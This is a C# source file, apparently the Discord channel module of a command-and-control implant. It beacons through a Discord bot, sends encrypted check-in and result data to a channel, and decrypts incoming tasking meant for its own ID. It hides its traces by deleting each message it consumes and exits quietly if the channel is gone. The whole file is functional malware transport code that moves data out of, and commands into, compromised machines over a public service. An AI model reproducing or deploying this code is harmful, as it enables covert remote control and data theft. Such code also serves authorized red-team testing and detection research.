using Agent.Interfaces;
using Agent.Models;
using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System.Net.Http;

namespace Agent.Profiles
{
    public class DiscordProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _token;
        private readonly ulong _channel_id;
        private readonly string _uuid = Guid.NewGuid().ToString();
        private ITextChannel _channel { get; set; }
        private readonly DiscordSocketClient _client;
        private readonly HttpClient _httpClient; 
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public DiscordProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            crypt = crypto;
            agentConfig = config;
            this.messageManager = messageManager;

#if LOCALDEBUGDISCORD
            _token = Environment.GetEnvironmentVariable("discord_token");
            Console.WriteLine(_token);
            _channel_id = ulong.Parse("1222855026737680384");
#else
            _token = "discord_token";
            _channel_id = ulong.Parse("bot_channel");
#endif

            var gateway_config = new DiscordSocketConfig()
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            };
            _httpClient = new HttpClient();
            _client = new DiscordSocketClient(gateway_config);
            _client.MessageReceived += _client_MessageReceived;
            _client.Ready += _client_Ready;
        }

        private async Task _client_Ready()
        {
            _channel = (ITextChannel)_client.GetChannel(_channel_id);

            if(_channel is null)
            {
                Environment.Exit(0);
            }
            clientReady.Set();
        }

        private async Task _client_MessageReceived(SocketMessage message)
        {
            if(message is null)
            {
                return;
            }


            MessageWrapper discordMessage;
            if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.Contains(_uuid))
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(await GetFileContentsAsync(message.Attachments.FirstOrDefault().Url));
            }
            else
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(message.Content);
            }

            if (discordMessage is not null &! discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
            {
                try
                {
                    _ = message.DeleteAsync();
                }
                catch { }

                if (!checkedin)
                {
                    cir = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), CheckinResponseJsonContext.Default.CheckinResponse);
                    checkinAvailable.Set();
                    return;
                }

                //If we make it to here, it's a tasking response
                GetTaskingResponse gtr = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr == null)
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived(this, tra);
            }

        }

        private async Task<bool> Start()
        {
            await _client.StartAsync();
            await _client.LoginAsync(TokenType.Bot, _token);
            clientReady.WaitOne();
            return _client.LoginState == LoginState.LoggedIn;
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe

            await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a checkin response message
            checkinAvailable.Wait();

            //We got a checkin response, so let's finish the checkin process
            this.checkedin = true;

            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                if (_client.LoginState != LoginState.LoggedIn)
                {
                    await this.Start();
                }

                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    continue;
                }

                try
                {
                    await this.Send(await messageManager.GetAgentResponseStringAsync());
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            if(_client.LoginState != LoginState.LoggedIn)
            {
                await this.Start();
            }

            string msg = this.crypt.Encrypt(json);
            MessageWrapper discordMessage = new MessageWrapper()
            {
                to_server = true,
                sender_id = _uuid,
                message = msg,
                client_id = "",
            };

            if(_channel is null)
            {
                _channel = (ITextChannel)_client.GetChannel(_channel_id);
            }

            if (json.Length > 1950)
            {
                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                {
                    try
                    {
                        await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
                    }
                    catch { }
                }
            }
            else
            {
                try
                {
                    await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
                }
                catch { }
            }

            return String.Empty;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
        private async Task<string> GetFileContentsAsync(string url)
        {
            string message = String.Empty;
            try
            {
                using (HttpResponseMessage response = await _httpClient.GetAsync(url))
                {
                    using (HttpContent content = response.Content)
                    {
                        message = await content.ReadAsStringAsync();
                    }
                }
            }
            catch { }
            return await Unescape(message) ?? "";
        }
        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
    }
}
